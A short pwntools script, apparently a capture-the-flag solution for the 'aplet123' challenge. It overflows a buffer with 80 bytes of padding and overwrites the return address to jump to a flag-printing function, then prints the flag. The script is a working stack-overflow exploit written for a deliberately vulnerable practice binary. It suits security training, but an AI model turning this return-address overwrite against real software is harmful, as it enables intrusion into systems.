from pwn import *

context.log_level = 'debug'

# r = remote("chall.lac.tf", 31123)
r = process("./aplet123")

pause()

r.recvuntil(b"hello\n")

flag_addr = 0x00000000004011e6
payload = b'a'*80+flat(0x8000, flag_addr)
# payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
r.sendline(payload)
flag = r.recvline()

print(f"flag: {flag}")